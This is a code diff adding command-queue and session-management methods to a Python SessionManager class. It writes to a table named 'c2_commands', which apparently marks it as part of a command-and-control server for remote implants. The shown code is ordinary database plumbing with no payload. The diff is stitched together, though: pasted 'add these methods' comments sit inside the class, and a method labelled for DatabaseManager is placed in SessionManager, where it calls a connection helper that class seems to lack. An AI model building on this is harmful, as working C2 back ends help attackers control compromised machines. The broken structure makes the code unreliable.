@@ -28,3 +28,46 @@ class SessionManager:
 
     def update_session(self, session_id: str, updates: dict):
         self.db.update_session(session_id, updates)
+
+    def get_pending_commands(self, session_id):
+        """Get pending commands for a session"""
+        return self.db.get_pending_commands(session_id)
+
+    def update_command_status(self, command_id, status):
+        """Update command status"""
+        return self.db.update_command_status(command_id, status)
+
+    def add_command(self, session_id, command, args=None):
+        """Add a command for a session"""
+        return self.db.add_command(session_id, command, args)
+
+    # Add these methods to SessionManager class in core/session_manager.py
+
+    def get_total_sessions(self):
+        """Get total number of sessions"""
+        return self.db.get_total_sessions()
+
+    def get_expired_sessions(self):
+        """Get expired sessions"""
+        return self.db.get_expired_sessions()
+
+    def remove_session(self, session_id):
+        """Remove a session"""
+        return self.db.remove_session(session_id)
+
+# Also add this method to DatabaseManager
+    def insert_command(self, command_data):
+        """Insert a command into the database"""
+        with self._get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO c2_commands (session_id, command, status, created_at)
+                VALUES (?, ?, ?, ?)
+            ''', (
+                command_data['session_id'],
+                command_data['command'],
+                command_data['status'],
+                command_data['created_at']
+            ))
+            conn.commit()
+            return cursor.lastrowid
